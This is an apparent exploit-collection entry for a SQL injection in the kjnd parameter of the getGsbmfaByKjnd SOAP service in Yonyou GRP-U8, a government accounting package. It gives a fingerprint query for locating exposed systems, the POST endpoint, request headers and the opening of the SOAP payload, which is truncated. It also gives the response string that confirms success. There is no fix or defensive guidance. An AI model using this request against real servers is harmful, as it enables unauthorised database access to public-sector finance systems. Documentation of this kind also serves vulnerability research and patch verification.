# 用友GRP-U8新政府会计制度专版getGsbmfaByKjndSQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /services/operOriztion HTTP/1.1`

**请求体 / payload**
```
漏洞位置
/services

参数kjnd存在SQL注入漏洞，返回响应为“qzvpqOZOHMMvtbLzaUYEuIzdQlgzOnITofSgBOeIxSsofqbvbq”表示存在漏洞
Cookie: JSESSIONID=89E46B07C2BF4021A3C408C6B580CC55
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 969
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:…（脚本共 1815 字，完整版见原文）
```

**其他**
- 用友GRP-U8 新政府会计制度专版getGsbmfaByKjndSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）